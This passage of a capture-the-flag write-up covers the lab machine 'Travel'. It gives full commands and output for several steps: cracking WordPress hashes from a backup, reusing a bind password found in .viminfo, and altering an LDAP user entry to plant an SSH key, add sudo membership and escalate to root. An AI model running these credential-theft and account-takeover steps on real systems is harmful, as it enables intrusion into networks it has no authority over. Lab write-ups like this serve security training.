admin | $P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/ | admin | admin@travel.htb | admin

There are still no username aside from __`admin`__ listed in the database.

####  4.1.3 Search for a Valid User

```shell
www-data@blog:/$ find /opt -readable -uid 0 -type f 2>/dev/null

  /opt/wordpress/backup-13-04-2020.sql
  
www-data@blog:/$ strings /opt/wordpress/backup-13-04-2020.sql

  INSERT INTO `wp_users` VALUES (1,'admin','$P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/','admin','admin@travel.htb','http://localhost','2020-04-13 13:19:01','',0,'admin'),(2,'lynik-admin','$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.','lynik-admin','lynik@travel.htb','','2020-04-13 13:36:18','',0,'Lynik Schmidt');
```

It seems like from the SQL backup file, there were initially two users in the __`wp_users`__ table:

user_login | user_pass | user_nicename | user_email | display_name
--- | --- | --- | --- | ---
admin | $P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/ | admin | admin@travel.htb | admin
lynik-admin | $P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc. | lynik-admin | lynik@travel.htb | Lynik Schmidt

### 4.2 Cracking the Hashes

```shell
$ hashcat --force -m 400 hashes /usr/share/wordlists/rockyou.txt

  $P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.:1stepcloser
```

### 4.3 Login via SSH as lynik-admin

```shell
$ ssh -l lynik-admin 10.10.10.189

lynik-admin@10.10.10.189's password: 1stepcloser

lynik-admin@travel:~$ cat user.txt

  829b1a348e8c6ed74b876c305c470492
  
```

## PART 5 : PIVOT TO ANOTHER USER (lynik-admin -> brian)

### 5.1 Machine Enumeration

#### 5.1.1 Host information

```shell
lynik-admin@travel:~$ cat /etc/passwd | grep -E "sh$"

  root:x:0:0:root:/root:/bin/bash
  trvl-admin:x:1000:1000:trvl-admin:/home/trvl-admin:/bin/bash
  lynik-admin:x:1001:1001::/home/lynik-admin:/bin/bash
  
lynik-admin@travel:~$ cat /etc/ssh/sshd_config

  [...omitted...]
  AuthorizedKeysCommand /usr/bin/sss_ssh_authorizedkeys
  AuthorizedKeysCommandUser nobody
  [...omitted...]
```

There is an __`AuthorizedKeysCommand`__ in the __`sshd_config`__ file. __`/usr/bin/sss_ssh_authorizedkeys`__ will be responsible to supply public keys that will be used for authentication. This helps with not having public keys locally stored into the server.

#### 5.1.2 User Directory Enumeration

```shell
lynik-admin@travel:~$ id

  uid=1001(lynik-admin) gid=1001(lynik-admin) groups=1001(lynik-admin)
  
lynik-admin@travel:~$ ls -la

  [...omitted...]
  -rw-r--r-- 1 lynik-admin lynik-admin   82 Apr 23  2020 .ldaprc
  [...omitted...]
  -rw------- 1 lynik-admin lynik-admin  861 Apr 23  2020 .viminfo

lynik-admin@travel:~$ cat .ldaprc
 
  HOST ldap.travel.htb
  BASE dc=travel,dc=htb
  BINDDN cn=lynik-admin,dc=travel,dc=htb
  
lynik-admin@travel:~$ cat .viminfo

  # Registers:
  ""1	LINE	0
    	BINDPW Theroadlesstraveled
  |3,1,1,1,1,0,1587670528,"BINDPW Theroadlesstraveled"
```

There is an LDAP bind password for the user __`lynick-admin`__ cached in the __`.viminfo`__ file as well the LDAP configuration for the said user. 

### 5.2 LDAP Enumeration

#### 5.2.1 ldapsearch

Looking at the available LDAP objects:

```shell
lynik-admin@travel:~$ ldapsearch -x -b 'dc=travel,dc=htb' -H ldap://ldap.travel.htb -w "Theroadlesstraveled" "objectClass=*"

  # lynik-admin, travel.htb
  dn: cn=lynik-admin,dc=travel,dc=htb
  description: LDAP administrator
  objectClass: simpleSecurityObject
  objectClass: organizationalRole
  cn: lynik-admin
  userPassword:: e1NTSEF9MEpaelF3blZJNEZrcXRUa3pRWUxVY3ZkN1NwRjFRYkRjVFJta3c9PQ=
  [...omitted...]
  # domainusers, groups, linux, servers, travel.htb
  dn: cn=domainusers,ou=groups,ou=linux,ou=servers,dc=travel,dc=htb
  memberUid: frank
  memberUid: brian
  memberUid: christopher
  memberUid: johnny
  memberUid: julia
  memberUid: jerry
  memberUid: louise
  memberUid: eugene
  memberUid: edward
  memberUid: gloria
  memberUid: lynik
  gidNumber: 5000
  cn: domainusers
  objectClass: top
  objectClass: posixGroup
  [...omitted...]
```

The current user, __lynik-admin__, is the LDAP Administrator which means everything here is pretty much under the user's control.

```shell
lynik-admin@travel:~$ ldapsearch -x -H ldap://ldap.travel.htb -w "Theroadlesstraveled" -b 'uid=brian,ou=users,ou=linux,ou=servers,dc=travel,dc=htb'

  # brian, users, linux, servers, travel.htb
  dn: uid=brian,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
  uid: brian
  cn: Brian Bell
  sn: Bell
  givenName: Brian
  loginShell: /bin/bash
  uidNumber: 5002
  gidNumber: 5000
  homeDirectory: /home/brian
  objectClass: top
  objectClass: person
  objectClass: organizationalPerson
  objectClass: inetOrgPerson
  objectClass: posixAccount
  objectClass: shadowAccount
```

There are many other users in the domain but I guess __`brian`__'s the lucky one.

#### 5.2.2 ldapmodify

This will be an attempt to edit the user, __`brian`__'s LDAP entry.

```shell
lynik-admin@travel:~$ cat /etc/group

  [...omitted...]
  sudo:x:27:trvl-admin
  [...omitted...]
```

First is to create an __ldif__ file that will be used to add a public key and change the group and password of the user:

```shell
lynik-admin@travel:~$ echo "dn: uid=brian,ou=users,ou=linux,ou=servers,dc=travel,dc=htb" > /dev/shm/brian.ldif

lynik-admin@travel:~$ echo "changetype: modify" >> /dev/shm/brian.ldif

lynik-admin@travel:~$ echo "add: objectClass" >> /dev/shm/brian.ldif

lynik-admin@travel:~$ echo "objectClass: ldapPublicKey" >> /dev/shm/brian.ldif

lynik-admin@travel:~$ echo "-" >> /dev/shm/brian.ldif

lynik-admin@travel:~$ echo "add: sshPublicKey" >> /dev/shm/brian.ldif

lynik-admin@travel:~$ echo "sshPublicKey: ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4DI4dq2RmPw/RCmKy6ss0SBs9X3qnK3UdM71KFOQzOvdhgD8F6rpUe3G2xxawWov2qeajOdE3bfmrfqH9EMoh1B2FgOoDP+/7LcvA2NhLXHtVPI1lvvmrI6BceLacnRTXxHsZbsJnF6CkHrDSZhhzmK0t8GEKocIabkfoweD+B+cO2/K3+D0Wm3eiNCyQldb/OydSgOxsK9/2Irp/X1WWErgtvzOAXCKYnQRJ154Xr907FEFl3jskE8bHnRJ7qHej3pM1epw6ecAeUpXiayjlSibT1rzTEEInx73NBeTq25Bew7TJ6C681ExlUvDh2jOeprvj1svP79lyaUckrB91g604D7AarJKzMrQlNj9/obBNFOgiOVNmvEtKDC2InKU6XMTSaRu7GeDw1I11cjRHYx8f0G2D/dEpHReupg+cIlvf8K7p5CRLmiXmDBPjPO7WfBBB3E4ZkOFvt+a3pjyVTNNUXT/ZDGtFNYSrmsJkJWL7yt6yKpRszOW63wZOfF0=" >> /dev/shm/brian.ldif

lynik-admin@travel:~$ echo "-" >> /dev/shm/brian.ldif

lynik-admin@travel:~$ echo "replace: gidNumber" >> /dev/shm/brian.ldif

lynik-admin@travel:~$ echo "gidNumber:27" >> /dev/shm/brian.ldif

lynik-admin@travel:~$ echo "-" >> /dev/shm/brian.ldif

lynik-admin@travel:~$ echo "replace: userPassword" >> /dev/shm/brian.ldif

lynik-admin@travel:~$ echo "userPassword: 1stepcloser" >> /dev/shm/brian.ldif

lynik-admin@travel:~$ ldapmodify -x -H ldap://ldap.travel.htb -w "Theroadlesstraveled" -D 'cn=lynik-admin,dc=travel,dc=htb' -f /dev/shm/brian.ldif

  modifying entry "uid=brian,ou=users,ou=linux,ou=servers,dc=travel,dc=htb"
```

```shell
lynik-admin@travel:~$ /usr/bin/sss_ssh_authorizedkeys brian

  ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4DI4dq2RmPw/RCmKy6ss0SBs9X3qnK3UdM71KFOQzOvdhgD8F6rpUe3G2xxawWov2qeajOdE3bfmrfqH9EMoh1B2FgOoDP+/7LcvA2NhLXHtVPI1lvvmrI6BceLacnRTXxHsZbsJnF6CkHrDSZhhzmK0t8GEKocIabkfoweD+B+cO2/K3+D0Wm3eiNCyQldb/OydSgOxsK9/2Irp/X1WWErgtvzOAXCKYnQRJ154Xr907FEFl3jskE8bHnRJ7qHej3pM1epw6ecAeUpXiayjlSibT1rzTEEInx73NBeTq25Bew7TJ6C681ExlUvDh2jOeprvj1svP79lyaUckrB91g604D7AarJKzMrQlNj9/obBNFOgiOVNmvEtKDC2InKU6XMTSaRu7GeDw1I11cjRHYx8f0G2D/dEpHReupg+cIlvf8K7p5CRLmiXmDBPjPO7WfBBB3E4ZkOFvt+a3pjyVTNNUXT/ZDGtFNYSrmsJkJWL7yt6yKpRszOW63wZOfF0=
```

After running __`/usr/bin/sss_ssh_authorizedkeys`__ for the user, __`brian`__, it is verified that the public key was successfully written for the user.

## PART 6 : PRIVILEGE ESCALATION (brian -> root)

```shell
$ ssh -i ~/Desktop/travel_brian.id_rsa -l brian 10.10.10.189

brian@travel:~$ id

  uid=5002(brian) gid=27(sudo) groups=27(sudo),5000(domainusers)

brian@travel:~$ sudo su - 
[sudo] password for brian: 1stepcloser

root@travel:~# id

  uid=0(root) gid=0(root) groups=0(root)
  
root@travel:~# cat /root/root.txt

  1c4d4d54d3e6c1931e7b3fa5ac28edb9
```

The added group (__`sudo`__) and the password change to __`1stepcloser`__ were successful as well.

---

## PART 7 : REFERENCES

- https://simplepie.org/

- https://github.com/WordPress/WordPress/blob/master/wp-includes/class-simplepie.php

- https://github.com/WordPress/WordPress/blob/master/wp-includes/SimplePie/Cache.php

- https://github.com/WordPress/WordPress/blob/master/wp-includes/SimplePie/Cache/Memcache.php

- https://riptutorial.com/php/example/4604/--sleep---and---wakeup--

- https://blog.scalesec.com/just-in-time-ssh-provisioning-7b20d9736a07

- https://simp.readthedocs.io/en/master/user_guide/User_Management/LDAP.html

- https://www.digitalocean.com/community/tutorials/how-to-use-ldif-files-to-make-changes-to-an-openldap-system

  
  
   